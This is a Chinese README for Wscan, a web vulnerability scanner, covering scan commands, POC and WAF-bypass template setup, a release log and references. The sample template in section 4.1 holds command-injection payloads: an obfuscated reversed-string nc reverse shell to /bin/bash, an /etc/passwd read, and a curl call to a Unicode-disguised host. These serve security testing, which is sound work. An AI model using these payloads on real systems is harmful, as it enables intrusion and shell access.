[**English Version**](./README_EN.md)
# 法律免责声明
未经事先双方同意，使用 Wscan 扫描目标是非法的。 Wscan 仅用于安全测试目的。
在使用之前， 请务必阅读并同意 [License](https://github.com/chushuai/wscan/blob/main/LICENSE.md) 文件中的条款，否则请勿安装使用本工具。

# wscan
Wscan是一款专注于WEB安全的扫描器，它向Nmap致敬，而Nmap已经开源25年了。我们也计划在未来25年内持续更新Wscan，并将其持续开源。我们欢迎所有对web安全感兴趣的人一起加入我们的开发团队。

我们的目标是开发一款使用机器学习进行渗透测试的工具。与其他工具不同的是，我们的工具可以自动学习攻击和防御的模式，并根据具体的目标进行个性化的攻击。这样一来，我们的攻击效率和准确性将大大提高，同时也能降低误判的概率。

我们的工具采用了机器学习技术，实现了全自动化的Web渗透测试。这意味着无需手动添加和更新规则和签名，它能够自动学习和适应新的攻击模式和漏洞。

机器学习技术还能够快速处理大量的数据和流量，从而大幅提高测试效率和准确性。此外，它能够识别和发现一些人工难以察觉的漏洞和弱点，从而改善测试质量和可靠性。

我们相信，使用机器学习技术进行渗透测试，将是未来网络安全的一个重要方向。我们希望我们的工具能够帮助更多的人保障网络安全，为网络安全事业做出贡献。

![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/9f9e48711df62c154bde487c989dd3a9.gif)

# 运行示例 

⬇️[下载地址](https://github.com/chushuai/wscan/releases) [🏠最佳实践](https://github.com/chushuai/wscan/blob/main/最佳实践.md)
```
(1) 主动扫描
./wscan  --log-level=debug ws --basic-crawler http://testphp.vulnweb.com/ --json-output=wscan_scan_result.json --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --browser  http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --url http://testphp.vulnweb.com/listproducts.php?cat=1  --json-output=wscan_scan_result.json
./wscan  --log-level=debug ws --url-file=/wscan/url_file.txt --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --poc=/your_wscan_poc/wscan-poc/pocs/* --url http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
(2) 被动扫描
./wscan  --log-level=debug ws --listen=127.0.0.1:1000 --json-output=wscan_scan_result.json  
(3) POC扫描
    3.1 POC下载地址 https://github.com/chushuai/wscan-poc/releases
    3.2 Wscan首次运行时，将会生成一个名为config.yaml的文件。您需要修改该文件中的以下内容，以指定include_poc的路径。
        prometheus:
            enabled: true
            depth: 1
            auto_load_poc: false
            include_poc:
                - C:\wscan_windows_amd64.exe\wscan-poc-1.0.0\pocs\*.yml
            exclude_poc: [] 
    3.3 通过命令行启用--plug=prometheus，并且指定--url-file(一行一个url)绝对路径，即可进行大范围POC检测
        ./wscan --log-level=debug ws --plug=prometheus  --url-file=/url_file.txt  --html-output=wscan_scan_result.html
(4) 自定义WEB通用漏洞扫描模板(Waf绕过/Waf测试)
    4.1 不同于POC测试，自定义WEB通用漏洞扫描插件，会对指定位置的参数进行FUZZ,
        样例参考 https://github.com/chushuai/wscan/tree/main/core/plugins/custom_tmpl/tmpl/owasp
        插件样例
        ---
        payload:
          - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
          - /etc/passwd
          - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
        encoder:
          - URL
        placeholder:
          - URLParam
          - HTMLForm
          - HTMLMultipartForm
          - JSONRequest
        type: "RCE"
        ...
    4.2 您需要修改config.yaml文件中的以下内容，以指定include_tmpl的路径。
        enabled: true
        depth: 0
        auto_load_tmpl: false 
        include_tmpl:
          - /wscan/core/plugins/custom_tmpl/tmpl/owasp/*.yml
        exclude_tmpl: [ ]
        block_status_codes: # 被WAF阻止时HTTP状态码列表,默认值为403
          - 403
        pass_status_codes: # 未被WAF阻止时HTTP状态码列表, 默认值为200或404
          - 200
          - 404
        block_regex: "" # 被WAF阻止网页的正则表达式
        pass_regex: "" # 未被WAF阻止网页的正则表达式
        non_blocked_as_passed: false
    4.3 通过命令行启用--plug=custom_tmpl，即可对目标网站进行自定义Payload测试。
        ./wscan --log-level=debug ws --plug=custom_tmpl  --browser  http://testphp.vulnweb.com/  --html-output=wscan_scan_result.html
(5) 独立部署反连模块
./wscan  reverse
```
# 项目进展
* 2023.11.05 发布v1.0.0 二进制版，支持简单的Web通用漏洞检测
* 2023.11.12 发布v1.0.1 二进制版，静态爬虫
* 2023.11.12 发布v1.0.2 二进制版，支持被动扫描
* 2023.11.19 发布v1.0.3 二进制版，支持JSONP插件
* 2023.11.26 发布v1.0.4 二进制版，修复XSS、SQL注入漏报的问题，支持对单个URL进行漏洞检测
* 2023.11.30 发布v1.0.5 二进制版，支持浏览器爬虫、支持URL、表单智能过滤
* 2023.12.02 发布v1.0.6 二进制版，支持输出JSON、HTML格式的扫描结果
* 2023.12.03 发布v1.0.7 二进制版，支持Yaml POC扫描插件
* 2023.12.04 发布v1.0.8 二进制版，支持通过命令行指定要启用的plugins
* 2023.12.09 发布v1.0.9 二进制版，支持自定义WEB通用漏洞扫描模板(Waf绕过/Waf测试)
* 2023.12.12 发布v1.0.10 二进制版，目录扫描内置400条常见规则、支持自定义扫描路径爆破。支持ASP、PHP通用命令执行检测
* 2023.12.24 发布v1.0.11 二进制版，支持独立部署反连模块，同时Yaml POC支持反连功能
* 2023.12.30 发布v1.0.12 二进制版，支持Goby JSON POC插件，多层URL目录POC扫描
* 2024.01.07 发布v1.0.13 二进制版，支持XXE、SSRF、Fastjson、 Struts2系列漏洞批量检测
* 2024.01.15 发布v1.0.14 二进制版，支持thinkphp系列漏洞批量检测
* 2024.01.18 发布v1.0.15 二进制版，支持PHP、JSP、ASP、ASPX任意文件上传检测、被动扫描支持智能请求过滤

# 开源时间表
Wscan的目标是创建一个开源且非盈利的项目。然而，由于Wscan的工作量庞大，代码仍在快速迭代中。
过早地进行开源可能导致各种各样的魔改版本涌现，这对工具的传播和项目未来的发展并不利。
因此，计划以Stars作为考量指标，分阶段分模块进行开源，以确保项目的稳健性和社区的有序参与。
1.  YAML POC扫描模块 (Stars > 400 开源)
2.  反连模块 (Stars > 400 开源)
3.  对内置的Payload不满意,自定义WAF绕过WEB通用漏洞检测模板 (特色功能)(Stars > 400 开源)
4.  SQL注入模块 (Stars > 500 开源)
5.  动态爬虫 (Stars > 600 开源)  
6.  目录扫描模块 (Stars > 700 开源)
7.  基线扫描 (Stars > 800 开源)
8.  基于消息订阅的插件调度模块 (Stars > 900 开源)  
9.  HTTP参数形变模块, 传统扫描模块全部开源, 可自行修改编译构建扫描器 (Stars > 1k 开源)
10. 机器学习降低误报模块 (Stars > 3k 开源)
11. 机器学习自动生成Paylaod模块 (Stars > 4k 开源)

# 架构简析
![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/a93d6e157be316b086faba9b6eebeebf.png)

# 参考代码
机器学习 https://github.com/cdipaolo/goml  
基于模板扫描 https://github.com/projectdiscovery/nuclei/    
基于模板扫描 https://github.com/wallarm/gotestwaf  
被动扫描 https://github.com/zema1/martian  
被动扫描 https://github.com/lqqyt2423/go-mitmproxy  
POC扫描  https://github.com/jweny/pocassist   
POC扫描  https://github.com/WAY29/pocV   
POC扫描  https://github.com/zema1/yarx    
动态爬虫 https://github.com/Qianlitp/crawlergo  
基础爬虫 https://github.com/geziyor/geziyor   
基础爬虫 https://github.com/gocolly/colly  
SQL注入 https://github.com/sqlmapproject/sqlmap  
XSS 检测 https://github.com/hahwul/dalfox  
网站技术  https://github.com/chushuai/wappalyzer   
JavaScript https://github.com/dop251/goja    
反连平台 https://github.com/lanyi1998/DNSlog-GO   
反连平台 https://github.com/chennqqi/godnslog    
子域名爆破 https://github.com/projectdiscovery/subfinder/  
WEB漏洞扫描器 https://www.zaproxy.org/  
WEB漏洞扫描器 https://github.com/andresriancho/w3af  
WEB漏洞扫描器 https://github.com/w-digital-scanner/w13scan  
WEB漏洞扫描器 https://github.com/Arachni/arachni
# 参考文章
推开 xray 之门 https://koalr.me/posts/a-tour-of-xray/  
HTTP 被动代理的那些事 https://koalr.me/posts/passive-scan-via-http-proxy/  
JSONP https://securitycafe.ro/2017/01/18/practical-jsonp-injection/

# 使用文档参考
xray 安全评估工具文档  https://docs.xray.cool/#/  
pocsuite3  https://pocsuite.org/guide/poc-specification.html

# 扫描报告参考
https://cdn.acunetix.com/wp-content/uploads/2022/01/11175019/scan-report-testphp.vulnweb.com-owasptopten2021-27_08_2021-12_05-PM.html  
https://www.arachni-scanner.com/reports/report.html/#!/summary/owasp_top_10  
https://docs.xray.cool/assets/report_example.html 

![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/118a026213bf2aca4f016218f626cf15.png)

# Star History

[![Star History Chart](https://api.star-history.com/svg?repos=chushuai/wscan,chaitin/xray,projectdiscovery/nuclei&type=Date)](https://star-history.com/#chushuai/wscan&chaitin/xray&projectdiscovery/nuclei&Date)



